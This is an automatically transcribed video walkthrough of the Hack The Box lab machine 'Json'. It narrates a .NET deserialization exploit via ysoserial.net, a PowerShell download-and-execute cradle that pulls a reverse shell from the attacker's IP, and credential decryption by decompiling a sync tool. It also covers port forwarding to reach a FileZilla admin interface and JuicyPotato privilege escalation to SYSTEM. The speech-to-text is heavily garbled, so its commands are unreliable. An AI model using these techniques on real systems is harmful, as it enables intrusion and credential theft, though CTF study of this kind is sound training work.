 what's going on YouTube the zipsak be doing JSON from hack the box and this box is probably easier done on Windows than Linux because the initial foothold and 2 to the 3 probe asks require Windows first off the initial foothold is a dotnet D civilization which unfortunately I'm not super familiar with dotnet DCO is a ssin like I am PHP and Java so we're just going to be using the tool why Sir Cyril net to get us code execution on the box and once we're on the box the first to provost will be done from windows the first one being it decompile a net application to see how it decrypts a config file the second one is running files el juez server manager application after doing support forwards to create a new ftp user and then the third premise we can just do from linux it is just juicy potatoes so that's super easy and I've said a lot so let's just jump in the box and start doing it as always a begin with and maps are - SC for default scripts as V the numerator jhin's Oh a output all formats play me and Matt for oh and call it JSON and then the IP address which is 10 10 10 158 can take some time to run so I've already ran it looking at the ports and we have a ton open the first one being is FTP on 421 and map says it's FileZilla FTP D and the only script is giving us output for is FTP - sis T and n map only shows the output of scripts that actually run successfully if it doesn't run successfully you don't really see it because if it showed you all the scripts it runs you'd literally be like des knowledge service with information so there is one thing I always like testing for with FTP and that's anonymous authentication so going FTP 10-10-10 158 I'm just gonna try logging in with anonymous anonymous and we get the password is incorrect so anonymous authentication is disabled however we learn one new piece of information and that is the file was ill a version number so I'm going to go over the Cherrytree control and declared a node control-shift-n to create a new child node and I'm gonna miss type interesting and just leave it that way because I don't feel like going back to rename it so the next thing we have is HTTP on port 80 and we see it's telling us Microsoft is httpd 8.5 and this is Windows 8 / 2012 and probably are too since it's a dot 5 we have the HTTP title being JSON htb and then a bunch of our PC ports being open on for 4 or 5 and map is saying it's either Windows 2008 r2 or Windows 2012 so let's see if we can just answer this question right now by googling Windows is versions so I'm going to go to google and type Windows Microsoft is versions and it's going to burp so let's turn poop off ok enter and we see let's see this page and was last updated 2017 so there's probably a newer article that has later operating systems but we can see 2008 2008 r2 is 7.0 and 7.5 and 2012 is 8.0 I'm guessing 8.5 would be r2 so we know right now this is a Windows 2012 box which I believe is end-of-life so potentially a profess new extended support is 2023 but I think if you don't have extended support you don't get patches so let's just move on with and map to see what else there is host scripts we have a clock skew of about 4 hours so if we do Kerberos stuff make sure we sync the time NetBIOS name is JSON so if we don't get a webpage we can try putting this in our host file then going to HTTP JSON to see if there's some type of virtual hosting that gives you a different page so let's do first name JSON and move on we have message signings enabled but not required so probably SMB really attacks would work if we have a second machine to relay an authentication attempt to and that is about it for nmap so let's go take a look at the web page going to 10-10-10 158 and while that loads we can do one last thing and that was run SMB client - capital L ten ten ten 1:58 just to see if there's any type of open share and when asked for the password just hit N and we can do - and Finola sonication I think but you don't really see that nowadays so you can normally ignore that we don't have anything so let's go take a look at the page and soon as I went here it's redirecting me to slash login dot HTML one of the pages do redirects I like looking very closely at the page to see if they're trying to hide our eyes so I click the X to stop loading the page so we can take a look at this and we see the copyright is 2019 so probably not a vulnerability and like a web package or something because that is the year this box was released we can see this may happen because we stopped the repression of the page there should be some type of JavaScript or something that real names this to be the actual username we get a bunch of dead links here or dead images so I'm going to press control U and see if we can find those actually we can do f12 or inspector or develop mode inspector and then click here and see if we see where that link is supposed to be at image - and don't see it right away let's just do the now King tab reload the page click X before oh I guess I already try to redirect us there we go so looking at this we see a bunch of 404s so this is interesting right now and normally when I see 404 is I like looking in to see exactly where the URL was because sometimes it directs you to a hostname that you just don't have DNS - but in this case it looks like the file just doesn't exist on the server at all so we get a 404 not found so we can put this in notes dead links everywhere and I can fix the hostname to be a hearse t name to just be hostname so let's take a look at the login page so slash logon HTML actually before you do that in this source I was just looking for like WordPress or Joomla not sure if I said that but looking at the login page control you and we don't see anything too interesting so let's try logging in with just admin admin it said email address but we haven't leaked any email addresses yet if this was SSL this is just saying not secure because it's HTTP but if 443 was open you may get like an email address out of the SSL certificate or at least the domain name so you could then guess like admin at domain name but since we don't know anything I'm just going to try admin admin and guess guest things like that I'm gonna send this over to burp suite so I can see what the login request looks like because that is always interesting we see it is JSON so contact might type application slash JSON and we're sending the username password I'm just gonna send this over to repeater to see how the server responds and we get a Roth to cookie so let's see exactly what this is echoed and paste this base64 dash D and we get a cookie that has a bunch of JSON so the cookie is kind of staying true to the boxes name and there's one thing I forgot to do that always liked doing and that is having some type of recon going in the background while I work some of you go Buster - you HTTP 10-10-10 158 - w4 west user share word list der buster directory list - 3 medium text - Oh out file and always see right now is HTML I'm gonna try like index.php we have to turn burp suite off doesn't look like that wants to learn okay forfor ASP for for aspx we get another 404 so we don't know exactly what extensions this is processing so I'm not going to do the - X flag and go Buster so I'm just gonna log it - go Buster root dot out and we forgot to specify the mood which is dir so rename this tab to recon and we can keep on going about a business so let's just for this request in burp suite to login with admin admin and see what happens so now we have logged in we are admin but we don't really have anything we can do like this interface didn't change if we go to like slash admin to see if this exists we get a 404 maybe go bust will help us eventually but right now we're kind of at a dead end so I'm gonna open up Firefox again refresh and see exactly how everything gets generated because maybe like this number is an API request or something from a browser and we can see it so refresh the page to look through everything that's loaded we by filter by status because we only want to hundreds and see a slash API slash account so let's try going to slash API slash account and see if we can figure out how this API works we just get authorization has been denied for this request so what I should have done is looked at exactly how this request works now we have everything going through burp suite that's much easier to do so let's just go to target we can click here and we can see everything it's doing so there's an API slash token and that's how I guess potentially how we login so if I go back to this repeater tab yes we logged into API slash token so what I really should have in go Buster is go Buster - you dir - you HTTP 10-10-10 158 / api w-4 word list and we'll do user share do one I have cyclist installed her no I do cyclist discovery variables secret keywords maybe I don't know exactly what's in this there's probably a good word list in SEC less or a sec list that has variables not exact web content API oh my VM froze well my terminal froze there's weird discovery web content API actions that can be a good one or not let's see exactly what this is ad so I'd probably run through a bunch of these to see if we get anything extra well I look thrill so going back to the sitemap we do have the account and the response the request is just this let's just send this that is what we get what was different between these two requests that we said so API slash account was it capital a so what I'm going to do go to proxy intercept refresh send now I want to compare these two API requests to see what is different so both of them contain the OAuth 2 cookie but this one through the API contains something called Bearer and I'm actually not too familiar with this so let's go over to Google and see what this header is so I just Google HTTP header Bearer and we see it's some type of authentication and swagger I'm gonna Google swagger dotnet to see if this is a dotnet thing swagger also known as open API so in this I may create a new tab called research swagger and we need to research the bearer token to see exactly what that is because it's just something that's unfamiliar to me so let's go and take a look at exactly what it this contains I'm going to send this request to make sure we can get a response back ok there we go and it looks like this is the same exact thing as our Roth to cookie so let's copy this and we can do echo dash n paste base64 dash D and we just get the same exact output as o oauth2 so if I wasn't already an administrator I'd try playing with changing this because the one thing I'm noticing in this cookie is there's no secret signing type of thing the password if we do echo - n base this WC - C 32 so I'm guessing that is just the hash of md5 sum so let's try echo - n yep so this is the md5 sum of the password which is admin so that's definitely something I'd probably note in a report saying your passwords are being sent an md5 or something let's see what happens if we just give this bad base64 in the beer so if we just send it please subscribe we get an error message and error messages are always good to see in web applications because it kind of gives you an idea how this is working message and error code invalid format base64 exception type nothing we don't get a stack trace so what happens if we give it some base64 so echo - n please subscribe and we'll do base64 and give it this paste and the reason why I wasn't trying this with the cookie is because it wasn't giving us a response back this is directly taking this input so we get a response back from it and we get an error has occurred exception message cannot be Ciara lies JSON net object so if I google around for JSON net exploits and when I see DC I realize I always look into it a hundred percent because she never Ciara lies some type of user input and it's deserializing our HTTP header of bearer so if we google JSON net object exploitation Oh wasp JSON marshals we get why sir serial dotnet why sir serial is a DC ization attack framework for Java why Sir Cyril net is a DC realization attack for dotnet and if we look at this JSON dotnet is within this list and we got two different gadgets that dis jumps to so the very first one was the object data provider so if this gadget doesn't work then I'll try the next one which was the Windows identity so this is a Windows program so we should probably run this on Windows one of you do DC realization attacks it always helps to do it in the same language it's written in in if you don't really understand it just look at my PHP videos of D civilization will kind of explain how it works and why it should always be in the language so I'm gonna switch over to Windows now to create our payload now that I'm on Windows and this is the commander VM from mandiant there's probably instructions in one of my videos for installing it but it's relatively straightforward if you just go to google and search for like commando VM mandiant you got this page and Scott install instructions here so I like this because it puts a bunch of tools straight on our list I'm gonna search maybe dotnet I only see il spy maybe search Carolee no let's see maybe raishin and search for a wiser serial we don't have anything so I don't think this is part of it we can also do like choko search why so serial to see if there's a package for this and I don't know what that error message is quit okay so we'll see if this comes back but why Sir cereal is actually not part of this VM so we have to go get it so I'm just gonna github why so serial dotnet and we can go here I don't know why that search isn't working but it's not needed I'm just going to make github and we can go into it and do get clone paste and it should be noted and like we could do it and put it in tools or wherever this stuff should be located however I hate just putting stuff here because this is where like the package manager for commando loads things so he's like storing it in my own location and then if the package manager ever supports this then I can delete it from my location and use the package managers so it's kind of why in Linux everything I do is under /opt because the package manager doesn't put things there so we do have the Wiseau serial directory and this is something you should compile yourself there is this release but I think the release is and debug which doesn't statically compiled things you'll get a bunch of dependencies errors we can try it real quick so if we copy everything and we can go in here why so serial we can just create the directory release and see if this works but I'm gonna go on a limb and say it won't so we go in release and execute it we get a weird dependency error so let's delete that and then compile it ourselves I really should have made this text bigger oh well let's open with Visual Studio 2019 and then we will just compile so I think it's open now it didn't load program got CS up on the window for me but it's not needed I can change the build to release rebuild solution and I'm gonna build the debug one as well to see if it also gives me two dependency errors just because I'm curious and this is open so now we got the both of them we go dir they are stored within Y so serial Ben let's go debug we can try to execute no I put all the DLLs for me so doesn't matter because we look at this we have the a lot more do LS than we did before so like Newton's soft and I think this the one that was airing before do we have the error message still initializer yeah and desk that options was the error message what font size is this 16 let's do 20 so and that DLL is here so we have all the DLL is needed to run Y so serial so let's run it and we need to specify the gadget the formatter the output and the command so gadget for a matter command and output and output can be either be wrong or base64 I'm gonna do it and raw and then base64 it myself just because that's how I like doing it I like to be able to read the payload by eye and then go for it so the first gadget we have is object data provider so - G object data provider and then the formatter is gonna be JSON net is there a capital n I think it is or is it yep JSON capital N and then the command I want to run I always like doing paying first so ping 10 10 14 - I believe and Windows is - n1 - pain once let's go to HT b and if config ton 0 10 10 14 - is my IP and then Oh for output raw we did base64 I mean I bet you can guess what's gonna happen oh I type a base64 there we go I was like I did not expect to see on base64 output but the one thing I am curious is is this going to be formatted utf-16 little-endian or not but we will be able to check that out so I'm just gonna copy that go back to IBM make to deserialize and go in here and v paint ser paste that in and we can see exactly how this works meta name start method parameters system collection ArrayList m/s score lib and we can see it's running CMD /c and then our command so we don't actually have to use by su serial every time because i don't see anything really customizing this week should be able just to edit this and we're meant by customizing if you went back in like the PHP DCR lies there's a bunch of things that had like the length of arguments and things so it could rebuild this doesn't have all those lengths so it's easy enough to just hot patch it and change this line if you wanted to see what the other one looks like windows identity i think it was we can look at this real quick so windows identity and format there's a lot more confusing so system claims that bootstrap context and then a bunch of base64 by copy this base64 and Dakota I have no idea what's gonna happen a 64 - D it's a bit more of a complex object I'm guessing that will get serialize holder yeah since it's formatted weird I don't want to go into this eventually I'll do a video on dotnet DCO ization to understand how all this works but I don't understand it good enough to explain yet so what I want to do is base 64 paint s here and it's II 1 go over here and he walk so this looks like it is going to be utf-16 little-endian so if lie echo - n paste this base64 - d XX d it is not it's just seven B may be different wine terminators so 7 b z o DZ o a and if we do cat ping x XD less we have just 0 a so we have a different line tomato between the two so if we have error messages make sure we take the base64 out of command l and not out of our thing so i don't think it's going to be an issue however there's little small things do become huge issues and it wouldn't surprise me if if you're taking like the offensive security exam and a little thing like that actually makes a whole load of difference i haven't actually taken offense a security exam so i don't know but there's a type of things they like to do to make sure you understand exactly what you're doing what I'm doing right now is just saying up a TCP dump on ICMP and we're going to paste a base64 it into the bearer tag send this we get an error message but we get a ping so we have validated we have code execution so the one thing that's going to be a small issue running commands is this uses single quotes so if I tried like my ie X payload which requires putting the URL within single quotes we're probably gonna have an issue so whenever my like powershell payload requires single quotes what I do is just do the PowerShell encoded command thing and that requires it to be utf-16 little-endian formatting we could base64 it on windows but it's a pain to base64 in Windows compared to Linux so I'm just gonna do it here so echo - n IX new object net dot web client download string HTTP 10 10 14 - and we'll call this please subscribe ps1 and if we xxd this I forgot to terminate a quote you can see let's do head - what this looks like so this is not in 16-bit format because I is ASCII 49 and II is ASCII 45 so if we do a I convert to the target utf-16 le x XD head - 2 you can see what that format looks like so this is how windows likes it and 16-bit little endian format so we have AI then 0 0 e 0 0 next thing to do is a 64 - W 0 I'm going to pipe echo afterwards so we have a line-break IX new object at web client downloads string that all looks good so now instead of ping we can do powershell - encoded command and you can also probably get rid of this CMD and then just put powershell there but let's try this hey 64 run me - w 0 echo copy and we're going to make dirt actually over here make the dub dub dub and then we'll call this will copy use it share nishang and then shells invoke powershell tcp ps1 and we called it please subscribe ps1 and edit this to put a command at the bottom there we go and the IP address we want is 10 10 14 - and the pork will be 9001 so we can do Python 3m HTTP server 80 so now we have a web server running and then we can just do NCL BMP 9001 go over and a book and we'll paste the run meteor last output click send we get an error message but the show has returned if we look on our pain - we do have the server doing the get on please subscribe ps1 so I'm going to rename this to be servers and then three is going to be shelves so the very first thing I like doing is probably running the wind peas that's windows privilege escalation awesome sweet and the way I'm going to do it and start putting a bunch of files on the server is to mount a drive so what I'm going to do is make the SMB CD SMB and we can do in packet SMB server - H and I'm gonna specify a username and password so the username is gonna be if SEC and the password is going to be you guessed it please subscribe and the reason why I like putting passwords my SMB is number one I hate when people just mount it and download all my contents and number two there are windows group policies to prevent clients from ever mounting SMB without credentials so this gets around both of those issues the share name will be patreon rocks and then I'm just gonna put my current working directory as the shared path so in order to mount this we have to create a secure string in PowerShell so we do dollar sign pass is equal to the password which was please subscribe did I put this in caps I did and then we'll do convert to secure string - as plain text - force look at this okay that looks good and now we can create a cadential object so new object system management automation dot PS credential username apes ACK and then the password is that variable look at our object that looks good so now we can do new PS Drive - name it's SEC and this could be just like Y : it can be anything this is the drive name so test name if sec - route 10 1014 - slash patreon rocks you don't support me on patreon you really should so - credential cred - PS provider file system so it looked like it's a lot of work but now this just saves a bunch of time so I can do CD upset : and I am in this SMB share so if we go back to our box and go in SMB and then drop that binary in this we can execute it and when we write to a file we just immediately gain access to it so we don't have to worry about dropping things on the box itself because everything is going over s and B back to us opt that's not it CP up privilege escalation awesome sweet when peas will do the exe and then I think it's one piece again let's just go in here and do a find find grab exe dollar sign so we copy the x64 release here if I do dir I can just magically execute this so when pzx see CMD fast if you don't do this it may take a while to run and I direct this to when peas fast dot txt so if I do LS and this we just magically have it so I can do tail - f so we can read the output as it goes out and the main downside - I guess wouldn't pees remotely is I have a lot of trouble getting it to display colors on windows but other than that it's not needed and by colors I mean if you go wind peas and look at it oh maybe exe it should output like this and nice super pretty colors if we had like actual command shell so how can do how to do that reverse with River shells but it's not to need it I'm gonna fast forward the video let this run and then we will go over exactly what it finds so now that it looks like it's done running we can go to the top and see exactly what this tool runs through so the legend not gonna be too useful because we don't have color but we got the Hearst name is JSON the product name which is Windows Server 2012 r2 data center so we were correct their rosters account 1 keyboard language is in Spanish so this would be useful if we want to like crack any passwords or anything we should take a note it may be Spanish users so probably use Spanish word list current time and time zone is Eastern OS bill number 9600 and let's see powershell when vent warning lapse so when does a vent falling nice to know because if they are then you can potentially have Splunk or something else so you know to be a bit more stealthy if they don't have windows event forwarding at all then maybe ignore it and also check for custom services that do it I can't remember that I'll stop my head when log beat when log beat is the custom service lapse environment variable system environments internet settings nothing useful drive information nothing useful UAC status users on the box so we have JSON administrator JSON super admin and user pool is for is so we have a user on the box that's non default which is super admin definitely interesting we have the SE impersonate privilege so probably juicy potato will work so let's do interesting and we can just copy this so there's one potential probe esque RDP sessions event log users order login credentials username super admin doesn't look like it as a password home folders so dotnet password policy so we can see it doesn't have any I don't see it actually I was going to see for like attempt before lockout but maybe it aired right here you can see the password complexity so you know to test for things like password because there is no password complexity requirement weird access denies this is going to be installed applications and one of the applications is sync to FTP and this is interesting because if you remember there is a file Zilla service that we haven't really looked into so sane to FTP could be useful scheduled applications Network shares all the default ones ports we have something listening on localhost so this would be something else to look into and this one's unique to me because we saw all these with nmap this is how like Windows our FEC does ports but this looks like a custom service firewall it is enabled current profile is public though so there is no firewall a bunch Pappy and credential foul sir this is stuff you should probably download you generally won't see it on hack the box but on pen test you'll definitely see it same with like saved Wi-Fi credentials browser information stuff I think we're getting into nothing left really cloud credentials and that is it so going back to our shells we could just go straight off and juicy potato to the server but we've done that like a hundred times so I'm not going to bother with that right now we will eventually now probably the last best path we do but I want to look into that um sync to FTP so CD / Program Files and then sync to FTP and we have a sync location dot exe and config we can just copy both of these two if set : and then like magic they are now on our box so let's look at the config sync location DXE config and we have the user and password and a security key so i'm guessing if we just echo well let's try the username first if we can't base64 this to get a user we know it somehow encrypted so echo dash n base64 dash D and we get a bunch of junk so we can google sync location as it synced to milk sync location decrypt and looking at this don't really see anything sync location Exe decrypt and no so what I'm going to do is open up a file browser and we will try to equip this decompile this on Windows and see how the decryption works so Windows HP boxes JSON SMB and I probably just mount this on a Windows machine but I have my VM currently in nap mode and that is always weird between things so don't know if that would work so I'm going to try to copy and paste it over so new folder JSON paste it in paste does not work copy no paste so let's see if config tun 0 Barton 0 e 0 copy and we'll see if this works I doubt it will I'll probably have to pause the video and get out of mat mode / patreon Rox you can't connect to it because it's not secure oh this needs to be smb3 let's see in packet SMB server - H SMB to support at that I'll probably have to reconnect this in the actual window server the shell so we can access it and wait oh the password to this VM is actually please subscribe so it just automatically logged in that's why I was confused like wait a second I have authentication enabled but nope I just created the same exact password on my Windows VM it's not so it was able to authenticate magically that's actually funny so have those copied we can begin looking at them the one thing I want to do because I know I'll forget and see if our shell still has access to it sec di yeah okay so we didn't lose access even though we restarted the service good to know so let's go back over to Windows and what we want to do is take sync location exe which I forgot to copy but D compile it and see how it decrypt information out of this config file so let's go and copy sync location DXE and then we can go and decompile it and to do that I want to use the tool dn spy so dotnet and we only got iOS by C colon backslash tools D we don't have d n spy so let's install it so how you install packages is open a elevated command prompt I went to power shown to control shift Anna you know it starts elevated when you're in system 32 and you can do chucko install dn spy you can also use I think CIN st but it is the chocolaty package manager and sometimes I find it doesn't give you output when asked for a question so just roll the dice and hit enter if it starts hanging but we're just waiting for it to actually install and there is the search command so if you do the same thing choco search dn spy it will tell you it exists and it's a lot slower than any lineage pack Linux package manager so here we go is installed and it has successfully installed it so software installed to program data chocolaty lib dn spy tools did it copy it to tools directory dotnet I don't see it there see hole and backslash tools dn spy don't see it here maybe see I NS t DN spy normally I think it automatically puts it in like your tool directory so I'm installing it this way with C inst and maybe this way it works software installed D and spy it's not there that sucks so let's go to this data this literally wasn't working yesterday it looks like they just updated the repository for a new version so maybe it's not like completely fixed yet so we have D in spy here if you wanted to use il spy we can go over that real quick I can just show you why I prefer DN spy that's why so serial tools dotnet il spy it's pretty much the same thing except DN spies gonna let's do one cool thing and it works better on like obfuscated stuff but users if sec desktop json sync location we can see it d compiles it we get like program here we can see the source code and going around here clicking we found copy and this is the decryption utility so it's script or decrypt cipher string you can look into decrypt to see how it does it but we can't edit anything so you can probably save this to like a visual studio project and then edit it that way can you before I say that right click I don't know I'm sure you can that seems like a useful feature but deanne spy does all that ten times better so opening this up we can do file open and go to a desktop see : user's upset desktop json sync location and I'm going to edit no view options font let's change this to 18 okay that should be fine so all the same exact things as before except you'll notice I do program and right-click something I can edit the method and that lets me edit this code and recompile it which is super handy so we just try running this we get a weird error message it needs a service it just can't work at all so what I want to do is edit the method and we want to put a print statement just before it so I'm going to do message box and message box is not loaded yet so that will be in the using system windows forms so now you see that went from red to green so we know this is a loaded method so windows show please support me on patreon so if I click compile and then we do file save all ok and now I'm going to execute this file again I really should have made a backup copy but I got the backup copy on Kali so it's fine we get the message box so what we want to do now is put the decryption code so let's go into this service one and click around until we find the decryption and we can see it here so let's copy go back to main and we can edit the method paste and we can make this prayer do if we want to can we just do tab to tab that all yep so we want to show username and password so we'll do show username + : + password and we see everything's in red so it doesn't know where these are for the flag we can probably just get rid of that and this one is I think system configuration using system configuration it is and if you did not know that you could have went back to this and when you do like edit method you can see everything it's using so out of all these assessment configurations probably the best if you save this to save this into like a visual studio format visual studio does a better job at recommending the libraries to be used but I digress let's just file save all and run this now and we get super admin : funny htb so we finally get creds and since its programs called sync to FTP I bet their FTP creds so if I typed my password incorrectly we could log in to Kali again and then FTP 10 10 10 1:58 super admin fun eh DB we get logged in we can do dir and it looks like we're in a home folder we do CD desktop dir there is route text there so we could also potentially go and edit his like PowerShell configuration files or whatnot about configuration like PowerShell start up an environment so we always execute power shell my bad we could edit his PowerShell start up like his bash or C equivalent to PowerShell so when he opens up PowerShell it runs our coding gives us a shell but since there's no like user running PowerShell here anything that file won't really do anything so deep sorry like CD dot dot again to see if we go up yet another directory we can't so I think that may be it however why don't we try like PS exact super admin at 10-10-10 158 PS exec pi is it and packet PS exec at install PS exact locate PS exact pi CD up and packet examples the exact PI there we go super admin at 10 10 10 158 funny HTP requesting shares and both of those aren't writable however I bet if we go into our shell we can use like invoke command to make this user run something so let's do that the first thing is to create the password environment or a password variable so pass equals convert to secure string funny HDB as plain text force and then create the cadential object so new object system automation management PS credential and the user is going to be super admin and the password is what we just created verify that assembly is loaded cred equals new object system dot automation management PS credential super admin pass Oh what did I screw up system let's see system management automation I have theirs reversed cred equals new object system management automation BS credential super admin pass there we go so we can do host name cuz PS promoting likes having proper host names which is JSON so invoke command - computer JSON - cadential cred - script block Who am I run this and see if it works oh crap I have a tight Bell credential Creed let's see exit and Cl vnp 9001 go all the way back to Burke send this to get the shell we did cuz I don't know how to kill that so going up we can just copy these copy paste copy oh that's not the one we want to copy oh god okay go up here wait a second and now hit down what I kept happening is I kept telling T MUX to go up and then hit down and it immediately went down so this what I want copy paste I really need to find a way to get a proper terminal on Windows so I can control C things without killing my whole shell cred - script block Who am I access denied so maybe that one doesn't work JSON pass say fu and NY HTP let's make sure that's correct super admin funny HTTP I just hit ctrl C there to see if I could copy that output so maybe that's not a user on the box su PE admin so what if we get it a bad thing because if this says like invalid password now I know I can just give up if it doesn't then maybe I have something wrong we still get access denied so we don't know if that's the password for the local user or not but I guess we can try we're running one thing from Windows and that is evil when RM so do we have this an apt app search evil win RM Google evil when RM because maybe we're just using everything wrong so this is doing Windows remoting from within Linux get clone CD evil twin RM and we need to install it does it have instructions help requirements quick install gem install evil when RM and then we just do this so you will win RM the IP 10 10 10 158 - you super admin - P fun eh TB and see if this works invoke command - credential we should fix the cadential to be valid I just want to try doing this without the - computer name so and the command still failed get an authorization error so maybe this user is not allowed to go in through Windows PowerShell I guess the last thing we could probably do is like SMB map - you super admin - p funny h TB h 10 10 10 158 and we get no access which means he passed off so we just do funny we get authentication failure so we know we have a way to a valid credential we just don't have access to powershell remoting the last thing we could do is - i instead of the IP we could try it with the host name so let's exit with why and edit our host file to put - host name in then add the line 10 10 10 158 and the box is JSON we can ping it to make sure we have the IP correct and then just change this IP out for JSON since we know the user is an and man if this doesn't work we could always try switching over to like Metasploit and then injecting a VNC service and then just doing it through the command line we could also use programs like cobalt strike or I think Metasploit does it cobbler I think is another one pretty much any c2 tool is going to give you the ability to do like a create token command and you can do it that way as well just doing it through PowerShell is a bit of a pain to do it so I think that's why we're having an issue I switched over to this show for something but we can see it again oh I want to do net local group administrators let's make sure super admin yeah he is a member okay so I'm not going to bother with all the VNC stuff because think about it it may not work because there's no interactive sessions on the box right now because according to Wimpy's there's no one logged in so maybe we'll try it at the very very end but right now let's move over to the second way to do this box because we covered the first one the first one was just getting this password then FTP in and downloading root text and at that point you're done but you didn't get a shell in the box and knocking a shell isn't satisfying so if we remember going back to the notes we do have this one weird port 14 147 and let's for that over to our Oh think about this I'm gonna have to do this one from Windows so let's kill a VPN on Kali then switch over to Windows to start it back up because hack the Box doesn't support running multiple instances of Open VPN so now we're starting it up once that goes green we should be able to ping 10 10 10 1:58 and it's going there we go we just went so now probably the next ping will work there we go and now we have to go and redo everything so let's get a instance of a web server running our box so we're going to make the directory dub-dub-dub and i'm going to go to see : tools in the Shang and we're going to copy the reverse shell here so copy invoke powershell tcp into the dub-dub-dub directory and we can edit with sublime text and what we want to do is copy the reverse line to the very bottom just like we did on Kali so ten ten ten ten ten fourteen two and Court 9001 so we can save this and then we want to rename this to be please subscribe when I open up a PowerShell and unfortunately I don't have T MUX on this so it's gonna be messy but oh well Desktop JSON dub dub dub Python - m hg p dot server on 80 okay so now what we have to do is start up netcat so powershell and cl vnp 9001 we got that loading let's go to Firefox and log into this guy so 10 10 10 158 and that should redirect us to login HTML and then add then to login and then I don't think we need burp for this I think we can do this just through Firefox so it says API account edit resend and this bearer that was from our cally box so CD was it deserialize and then base64 rami dot sir copy go back paste then click send and we can double click the thing look at the response we see the error message but we don't see a shell doesn't it'll get got it which is weird - - spine 10 10 14 - and we can resend there we go I'm not sure why I need do the bind I guess sometimes Python web server doesn't bind on all sockets on windows no idea but now we have a shell so what we want to do is get chisel on this box and we want chisel so we can do that remote port forward because we need to get where as Jerry here we need get this port listening on our windows box so I don't think we have chisel installed on this it's kind of a I don't know if many people that use it outside of me well probably a lot of people now that I've shown in videos but let's do github chisel okay powershell CD desktop CD github git clone and then CD chisel and we want to go build because I don't think they have a release oh they do we could have just done this oh well it's built now dot slash chose without exe awesome so now we can copy this into a dub dub dub directory so C colon users epic desktop JSON dub dub dub and we can go to the river shell and find a place we can write so users public music echo test to T we can write here so we can do W get ten ten fourteen to slash chiselled exe - outfile chisel dot exe ready here enter a few times sometimes like the Python web server gets hung up and you just have to go to it Anna that's why I did so we can do dot slash chiseled exe - H and we have chisel running in both the client both ends of the connection so what I'm going to do is we have echo server here oh I wish I could tell these windows I'm really lost without tea muck sometimes CLS CLS ok we can't clear this cuz the term variables whatnot but to the left side is gonna be a reverse shell this is gonna be a server and if this doesn't make sense I recommend watching the reddish video that's our EDD is H because that's where we go over a port forwarding and all this type of stuff and we use chisel so we got start the chisel server so we're going to do chisel server - P 8,000 up so I'm gonna do - H because I want to see how to set the host so probably - - host and - - port so we'll do chisel - - host 1010 14 - - - port 8000 and we want to allow reverse connections because what we're going to be doing let's see mspaint we're going we have us the server and then a service so this is us this is going to be JSON and this is FTP so we a port to go from us from us to JSON and then from JSON to FTP so this is reverse connection it explained it's explained better and chisel go watch that so start this command and then we can go here dot slash chiselled exe client and we want to connect to ten ten fourteen to on port 8000 because that's what we set chisel up to and then the port forwarding rule we want is are : 14 147 one 27001 14 147 antenna and hope it connects doesn't look like it's connecting come on shuttle server host 10 10 14 to see Oh as soon as I hit control-c it connected hopefully it's still connected CMD netstat a.m. LP and let's see one we can just do fine string 1 4 1 4 7 ok we're listening so we're good so lesson learned whenever you start a server on like a command prompt and windows there's something's not working hit enter because that magically fixed it so now we go to Bill download the FileZilla server so if you just Google FileZilla download you can come here download it save it and then open it I agree install it we don't want to start this I guess do not start the service if user logs in start manually now we can start the interface after SEP completes that's fine all we wanted was this interface so this is how FileZilla manages itself they have a server it starts up a admin server on port 1 for 147 only accessible to localhost we forwarded localhost from the server all the way to our box so now we can access jason's localhost 1 4 1 4 7 port so if I click connect it will go through this proxy and out on this proxy and then access local host on JSON which is what just happened so I click this users tab and maybe that's not what just happened exit I really hope it just didn't kill my port CMD netstat a LAN fine string 1 4 1 4 7 listening I hope so if I was ill open there so let's try this again server interface localhost 1 4 1 4 7 shared folders we should see users ok so better idea let's get the show again NCL vnp 9001 and instead of doing one for one for seven let's do one for one for eight CD users public music because what I think is happening is every time I start this filezilla thing up it is killing whatever is listening on this port and then listening again so 10 10 14 to 8 thousand are one four one four eight one point seven zero zero one one four one four seven so this will connect back to us I'm going to restart this real quick so it's going to connect back to us take whatever is once it connects to us it's gonna have us listen on one four one four eight and any time we connect to it it's going to send it back through chiselin end up on one four one four seven at least that is the plan so now we just redirected we can see proxy one one four one four eight it is directed to one four one four seven so server interface one four one four eight click connect click users and here we go so that was the issue because I installed FileZilla server every time I open this it started to hijack in that port and we didn't get through so we can see the user super admin here good membership and stuff and we can see the share folder so we could add a new share folder to just be see and add a new user let's see remove add if sac should be a member of no group that's fine directory is going to be see he can do everything he wants to see and then general an able account password is going to be password click ok so now if I open up CMD FTP 1010 14 - if set to say please subscribe a password password quit FTP 1010 14 - let's just change his password to be if sec so username yep SEC password IPSec hip sac tip SEC incorrect why is this incorrect general C read/write set us home copy test directories see : let's try this and test should have that password that's fine exit quit test funny htb quit user it's going to be super admin fu n NY h TB oh crap ten ten ten 156 158 upset exec there we go so now I can access the server C Drive so we could edit any file we want so you can see we can get into super admin and do this so that is the second way to do this box the third and final way is back on Kali so let's do that and do the hot potato juicy potato method hopefully that goes smoother than this one because this one was painful exit sure there we go root let's start OpenVPN back up and we'll have to get a shell but that shouldn't be too tough as we just have to afford a request in Britt so I'm going to listen on port 9000 one go over to Burke send the request and we should get a shell and then with this shell let's just mount a drive so please subscribe convert to secure string as plain I don't think I need text I think I can just do as plain maybe not wait I did not do the quote right copy paste copy paste there we go that's fine next thing we need to do is create the credential object so credit equals new object system management automation PS credential tip SEC pass it's sorry about this time regretting putting a password on my SMB server but it's for the better new PS drive named epoch root 10 10 14 to patreon rocks credential cred - PS provider file system CD EPS ACK sweet so now we're here we can download juicy potato so github juicy potato and if we go to releases they can download juicy potato dot exe and in or SMB folder so MV downloads juicy potato I'm just gonna name it JP dot exe to make it easy to execute so if we do JP THC Richard output how to use it and while we're here let's go cat deserialize run meteor and I just want to copy this base64 actually we can copy this whole thing and then V run dot that pace this CM d /c a good measure should be fine copy run dot that to see : users public music run dot bat ok so now we can do /j p exe and we need the create process star doesn't both so I'm going to do star - p4 program we're going to do users public run dot bat - L this can be any port I'm going to do 9001 actually we'll do leap if we keep reusing 9001 eventually it's going to confusing for some people and then let's see what else do we need we may need to do the clsid but maybe not and CL vnp 9001 go to servers i'm it clear and start this up so we know if we hit it that means if i just run this now we magically can get a she'll go back to servers don't have anything and we failed so maybe it doesn't like this clsid so let's pick a different one okay let's go to page again or is his post cos ID here's the thing that says interesting cos IDs 2012 datacenter and oh come on why is this not saying system there better page for this let's see here clsid data center okay so now we can see system so let's try the first wua serve - see paste the next won't try is when management I not like that long argument - see put this in quotes maybe okay there we go so one of that in single quotes but here we go as end here authority system so now we have a shell as the system user we go to super admin CD desktop and we can get route text so that is a bunch of ways to do 